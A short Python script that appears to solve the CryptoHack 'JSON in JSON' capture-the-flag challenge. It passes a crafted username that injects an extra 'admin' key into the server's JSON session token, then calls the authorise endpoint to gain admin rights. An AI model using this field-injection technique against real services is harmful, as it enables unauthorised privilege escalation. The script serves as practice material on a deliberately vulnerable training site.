import requests


BASE = "https://web.cryptohack.org/json-in-json"


def create_session(username: str) -> str:
    return requests.get(f"{BASE}/create_session/{username}/").json()["session"]


def authorise(token: str) -> dict:
    return requests.get(f"{BASE}/authorise/{token}/").json()


s = create_session('user", "admin": "True')
print(authorise(s))
